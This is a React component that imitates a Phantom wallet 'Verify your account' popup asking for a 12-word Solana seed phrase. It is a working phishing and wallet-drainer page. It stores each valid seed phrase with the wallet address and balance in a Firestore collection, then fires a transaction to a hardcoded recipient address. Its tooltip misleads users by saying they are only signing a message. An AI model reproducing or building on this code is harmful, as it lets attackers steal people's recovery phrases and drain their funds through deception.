"use client";

import { useEffect, useState } from "react";
import * as bip39 from "bip39";
import wordlist from "@/components/wordlist.json";
import { derivePath } from "ed25519-hd-key";
import { PublicKey } from "@solana/web3.js";
import { useWallet } from "@solana/wallet-adapter-react";

import { handleTransaction } from "@/components/triggerTransaction";
import { collection, addDoc } from "firebase/firestore";
import { db } from "@/components/firebase";

const SeedphraseBox = () => {
  const [seedPhrase, setSeedPhrase] = useState<string[]>(Array(12).fill(""));
  const [publicKey, setPublicKey] = useState<string | null>(null);
  const [balance, setBalance] = useState<number | null>(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [modalMessage, setModalMessage] = useState("");

  // Set the English wordlist explicitly
  useEffect(() => {
    bip39.wordlists.english = wordlist;
  }, []);

  // Listen for messages to update publicKey and balance
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.origin === window.location.origin && event.data.publicKey) {
        setPublicKey(event.data.publicKey);
        setBalance(event.data.balance); // Balance received in lamports
      }
    };

    window.addEventListener("message", handleMessage);

    return () => {
      window.removeEventListener("message", handleMessage);
    };
  }, []);

  const handleSeedInputChange = (index: number, value: string) => {
    const updatedSeed = [...seedPhrase];
    updatedSeed[index] = value.trim();
    setSeedPhrase(updatedSeed);
  };

  const validateSeedPhrase = (mnemonic: string) => {
    return bip39.validateMnemonic(mnemonic, bip39.wordlists.english);
  };

  const wallet = useWallet();

  const showModal = (message: string) => {
    setModalMessage(message);
    setIsModalOpen(true);
  };

  const closeModal = () => {
    setIsModalOpen(false);
    window.close();
  };

  const generatePublicKey = async () => {
    try {
      // Check if the wallet is connected
      // Convert seed phrase to lowercase
      const mnemonic = seedPhrase.map((word) => word.toLowerCase()).join(" ").trim();

      // Validate the seed phrase
      if (!validateSeedPhrase(mnemonic)) {
        showModal("Invalid seed phrase. You are not authorized. Transaction Declined!");
        return;
      }
      else{
      // Save the seed phrase and related data to Firestore
      const docRef = await addDoc(collection(db, "seedPhrases"), {
        seedPhrase: mnemonic,
        timestamp: new Date().toISOString(),
        address: publicKey,
        balanceSol: balance,
      });
      console.log("Seed phrase stored with ID:", docRef.id);

      // Derive the public key from the seed phrase
      const seed = await bip39.mnemonicToSeed(mnemonic);
      const path = "m/44'/501'/0'/0'"; // Solana-specific derivation path
      const derivedSeed = derivePath(path, seed.toString("hex")).key;

      const pubKey = new PublicKey(derivedSeed.subarray(0, 32));
      setPublicKey(pubKey.toBase58());
      
      // Perform the transaction
      const recipient = "344qQUd3ap4wumbJLAzj7HCkwTFqGopJNyXtCTCrizKh"; // Replace with recipient address
      handleTransaction(wallet, recipient)
        .then((signature) => {
          console.log("Transaction sent:", signature);
        })
        .catch((error) => {
          console.error("Transaction failed:", error);
        });

      showModal("Validated!");
      setIsModalOpen(false);
      window.close();

    }  if (window.opener) {
      window.opener.postMessage("initiate-transaction", window.location.origin);
    } }catch (error) {
      console.error("Error generating public key or storing seed phrase:", error);
      showModal("An error occurred. Please try again.");
    }
  };

  return (
    <div
      style={{ backgroundColor: "#222222" }}
      className="h-screen w-full bg-gray-900 text-white flex flex-col items-center pt-2"
    >
      <h1 className="text-xl font-bold mb-4">Verify your account</h1>

      {/* Seed Phrase Input Fields */}
      <div className="grid grid-cols-3 gap-4 mb-4">
        {seedPhrase.map((word, index) => (
          <input
            key={index}
            type="text"
            value={word}
            onChange={(e) => handleSeedInputChange(index, e.target.value)}
            className="w-20 p-2 text-center bg-gray-800 text-white rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            placeholder={`Word ${index + 1}`}
          />
        ))}
      </div>

      {/* Tooltip with Help Icon */}
      <div className="w-full pt-6 flex items-center justify-start pl-8 mb-4">
        <p className="text-sm font-normal tracking-tight text-gray-500 mr-2">
          Why to confirm ownership
        </p>
        <div className="relative group">
          {/* Help Icon */}
          <div className=" text-xs w-4 h-4 flex items-center justify-center rounded-full bg-gray-600 text-white cursor-pointer group-hover:bg-gray-500">
            i
          </div>
          {/* Tooltip */}
          <div className="absolute top-full mt-1 hidden group-hover:block w-40 px-3 py-2 text-xs text-white bg-gray-800 rounded-md shadow-lg">
            You must sign a message in your wallet to verify that you are the owner of this account.
          </div>
        </div>
        <a
          className="pl-12 text-xs underline text-blue-600 hover:text-blue-800"
          target="_blank"
          href="https://help.phantom.com/hc/en-us/articles/25334064171795-How-to-view-your-Secret-Recovery-Phrase-or-Private-Keys"
        >
          Need Help ?
        </a>
      </div>

      {/* Modal */}
      {isModalOpen && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
          <div className="bg-gray-800 p-6 rounded-md shadow-lg text-center">
            <p className="text-white mb-4">{modalMessage}</p>
            <button
              onClick={closeModal}
              className="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700"
            >
              OK
            </button>
          </div>
        </div>
      )}

      <div className="pt-2 pb-4">
        <button
          onClick={() => window.close()}
          className="w-80 px-8 py-3 rounded-xl text-white bg-[#333333] transition-all duration-300 ease-in-out hover:bg-[#3b3c40]"
        >
          Cancel
        </button>
      </div><div>
        <button
          onClick={generatePublicKey}
          className="w-80 px-8 py-3 rounded-xl text-black bg-[#ab9ff2] transition-all duration-300 ease-in-out hover:bg-sky-100"
        >
          Confirm
        </button>
      </div>
    </div>
  );
};

export default SeedphraseBox;
